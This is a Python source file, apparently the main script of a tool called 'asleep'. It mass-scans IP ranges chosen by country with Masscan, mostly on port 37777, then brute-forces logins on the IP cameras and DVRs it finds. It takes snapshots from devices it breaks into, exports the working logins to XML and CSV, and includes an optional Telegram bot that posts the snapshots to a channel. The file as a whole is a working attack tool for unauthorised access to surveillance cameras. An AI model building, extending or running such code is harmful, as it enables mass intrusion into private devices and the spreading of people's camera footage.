#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import optparse
import os
import platform
import random
import subprocess
import sys
import time
from pathlib import Path
from queue import Queue

from colorama import init
from countrycode import countrycode
from pyfiglet import Figlet

import config
import export
import utils
from bot import Poster
from brute import BruteThread
from geolocation import IPDenyGeolocationToIP
from snapshot import ScreenshotThread

# TODO: make bruteforce core function
# TODO: rewrite with importlib, python-netsurv, git://dhondta/sploitkit

def process_cameras():
    brute_file = config.tmp_masscan_file
    hosts = utils.masscan_parse(brute_file)
    ip_count = len(hosts)
    config.logging.info(f"Parsed {ip_count} IPs from Masscan output")

    if not hosts:
        return False
    if ip_count < config.default_brute_threads:
        config.default_brute_threads = ip_count
        config.default_snap_threads = max(1, ip_count - 20)

    ips_list_file = config.ips_file % config.start_datetime
    full_ips_list = Path(config.reports_folder) / ips_list_file
    with open(full_ips_list, 'w') as file:
        for host in hosts:
            file.write(host[0] + ":" + host[1] + "\n")
    config.logging.info(f'IPs saved to {full_ips_list}')

    config.total = len(hosts)

    try:
        brute_queue = Queue()
        screenshot_queue = Queue()

        for _ in range(config.default_brute_threads):
            brute_worker = BruteThread(brute_queue, screenshot_queue)
            brute_worker.daemon = True
            brute_worker.start()

        for _ in range(config.default_snap_threads):
            screenshot_worker = ScreenshotThread(screenshot_queue)
            screenshot_worker.daemon = True
            screenshot_worker.start()

        config.logging.info(f'Starting to brute total {len(hosts)} devices\n')
        for host in hosts:
            brute_queue.put(host)

        brute_queue.join()
        screenshot_queue.join()
        # raise exception here
        print('\n')

    except Exception as e:
        config.logging.error(e)
        config.logging.info("Brute process interrupt!")
        config.logging.debug(config.working_hosts)

    config.logging.info(f'Results: {len(hosts)} devices found, {len(config.working_hosts)} bruted')
    config.logging.info(f'Made total {config.snapshots_counts} snapshots')


def masscan(filescan, threads, resume):
    config.logging.info(f'Starting scan with masscan on ports {", ".join(config.global_ports)}')
    if resume:
        config.logging.info('Continue last scan from paused.conf')
        params = ' --resume paused.conf {config.additional_masscan_params()}'
    else:
        params = ' -p %s -iL %s -oL %s --rate=%s %s' % (
            ",".join(config.global_ports), filescan, config.tmp_masscan_file, threads, config.additional_masscan_params())
        params += ' --http-user-agent="Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"'
    if platform.system() == 'Windows':
        mmasscan_path = config.masscan_windows_path
        binary = mmasscan_path
    else:
       mmasscan_path = config.masscan_nix_path
       binary = f'sudo {mmasscan_path}'

    try:
        if platform.system() == 'Windows':
            subprocess.Popen(
                [mmasscan_path, '-V'],
                bufsize=10000,
                stdout=subprocess.PIPE)
        else:
            subprocess.Popen(
                [mmasscan_path, '-V'],
                bufsize=10000,
                stdout=subprocess.PIPE,
                close_fds=True)
    except OSError:
        config.logging.error(
            'Please install Masscan or define full path to binary in .config file.')
        sys.exit(0)

    os.system(binary + params)
    if not Path(config.tmp_masscan_file).exists():
        config.logging.error('Masscan output error, results file %s not found. Try to run Masscan as Administrator (root)' %
                      config.tmp_masscan_file)
        sys.exit(0)


def get_options():
    parser = optparse.OptionParser('%prog' + " [-s <scan file>] [-b <brute file>] -t <threads>")
    parser.add_option('-s', dest='scan_file', type='string',
                      help='IP ranges list file to scan. Example: 192.168.1.1-192.168.11.1')
    parser.add_option('-b', dest='brute_file', type='string', help='IPs list file to brute, in any format')
    parser.add_option('-m', '--masscan', dest='brute_only', action="store_false", default=True,
                      help='Run Masscan and brute it results')
    parser.add_option('--masscan-resume', dest='masscan_resume', action="store_true", default=False,
                      help='Continue paused Masscan scan')
    parser.add_option('--no-snapshots', dest='snapshots_enabled', action="store_false", default=True,
                      help='Do not make snapshots')
    parser.add_option('--no-xml', dest='no_xml', action="store_true", default=False,
                      help='Do not make SMART PSS xml files')
    parser.add_option('-t', dest='threads', default=str(config.default_masscan_threads), type='string',
                      help='Threads number for Masscan. Default %s' % config.default_masscan_threads)
    parser.add_option('--dead', dest='dead_cams', action='store_true', default=False,
                      help='Write not bruted cams to file')
    parser.add_option('-d', dest='debug', action='store_true', default=False, help='Debug output')
    parser.add_option('--country', dest='country', action='store_true', default=False, help='Scan by country')
    parser.add_option('--random-country', dest='random_country', action='store_true', default=False,
                      help='Scan by random country')
    parser.add_option('-l', dest='logins_passes', action='store_true', default=False,
                      help='Brute combinations from %s and %s instead of %s' % (
                      config.logins_file, config.passwords_file, config.logopass_file))
    parser.add_option('-p', '--ports', dest='ports', type='string',
                      help='Ports to scan, 37777 by default. Example: 37777,37778')
    (options, _) = parser.parse_args()

    country = ''
    city = ''
    count = 0
    
    config.snapshots_enabled = options.snapshots_enabled

    if options.ports:
        print('It`s better to run with "-d" flag while setting custom ports!')
        print('That`s why this forced c;\n')
        options.debug = True
        config.global_ports = options.ports.split(',')

    if options.masscan_resume:
        options.brute_only = False

    if options.random_country:
        options.brute_only = False
        count = 600000
        total_count = 0
        total_range = []

        while config.max_ips < count:
            country = random.choice(countrycode.data['country_name'])
            for stored_c in list(dict.fromkeys(config.random_countries)):
                if country is stored_c:
                   continue
            locator = IPDenyGeolocationToIP(country, city)
            try:
                range_list = locator.get_random_ranges(max_ips=int(count), day_ranges=True)
            except Exception as e:
                config.logging.debug(e)
                continue
            total_range += range_list
            slash = ['|', '/', ' ', '-']
            print(f'Searching for a bright-day ip-ranges {random.choice(slash)}', end='\r')
            time.sleep(2) # spell from ban
            for cidr in range_list:
                count2 = IPDenyGeolocationToIP.get_cidr_count(cidr)
                total_count += count2
            config.max_ips = total_count
        else:
             config.logging.info('Generated %s IPs from %s' % (total_count, list(dict.fromkeys(config.random_countries))))
             config.global_country = random.choice(config.random_countries)
             file = open(config.tmp_masscan_file, 'w')
             file.write("\n".join(total_range))
             file.close()
             options.scan_file = config.tmp_masscan_file

    if options.country:
        options.brute_only = False
        country = input('Enter country name (defaut random): ')
        if not country:
            country = random.choice(countrycode.data['country_name'])
            print('Selected %s' % country)
        config.global_country = country
        city = input('Enter city name (default none): ')
        count = input('Maximum IPs (default 1000000): ') or 1000000
        locator = IPDenyGeolocationToIP(country, city)
        range_list = locator.get_random_ranges(max_ips=int(count))
        total_count = 0
        for cidr in range_list:
            count3 = IPDenyGeolocationToIP.get_cidr_count(cidr)
            total_count += count3

        config.logging.info('Generated %s IPs from %s' % (total_count, config.global_country))

        file = open(config.tmp_masscan_file, 'w')
        file.write("\n".join(range_list))
        file.close()

        options.scan_file = config.tmp_masscan_file

    if not options.brute_file:
        options.brute_file = config.tmp_masscan_file
    else:
        config.custom_brute_file = True
        config.tmp_masscan_file = options.brute_file

    if not Path(options.brute_file).exists() and options.brute_only:
        config.logging.error('File with IPs %s not found. Specify it with -b option or run without brute-only option'
                      % config.tmp_masscan_file)
        sys.exit(0)

    if not options.scan_file and not options.brute_only and not options.masscan_resume:
        config.logging.error("No target file scan list")
        parser.print_help()
        sys.exit(0)

    return options


def main():
    init()
    print(Figlet(font='slant').renderText('asleep'))
    print('https://t.me/asleep_cg\n')

    options = get_options()
    if options.debug:
        config.logging.getLogger().setLevel(config.logging.DEBUG)
    else:
        config.logging.getLogger().propagate = False
    utils.setup_credentials(options.logins_passes)
    utils.prepare_folders_and_files()
    if not options.brute_only:
        masscan(options.scan_file, options.threads, options.masscan_resume)
    process_cameras()
    if not options.no_xml and len(config.working_hosts) > 0:
        export.save_xml(config.working_hosts)
    export.save_csv()
    if options.dead_cams:
        hosts = utils.masscan_parse(config.tmp_masscan_file)
        export.dead_cams(hosts)

    # Configs for Telegram Bot:
    ROOM_ID = '' # Channel ID
    TOKEN = '' # Bot Token
    SNAPSHOT_DIR = Path.cwd() / config.snapshots_folder
    """ delete=True removes snapshots after posting """
    #poster = Poster(SNAPSHOT_DIR, TOKEN, ROOM_ID, delete=False) 
    #poster.start()  ### Start posting function

    if Path(config.snapshots_folder).exists():
        c_error = False
        if config.global_country:
            try:
                Path(config.snapshots_folder).rename(f'{config.global_country}_{config.start_datetime}')
            except:
                c_error = True
        elif not config.global_country or c_error:
            Path(config.snapshots_folder).rename(f'Snapshots_{config.start_datetime}')


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n')
        config.logging.info('Interrupted by user')
        sys.exit(0)
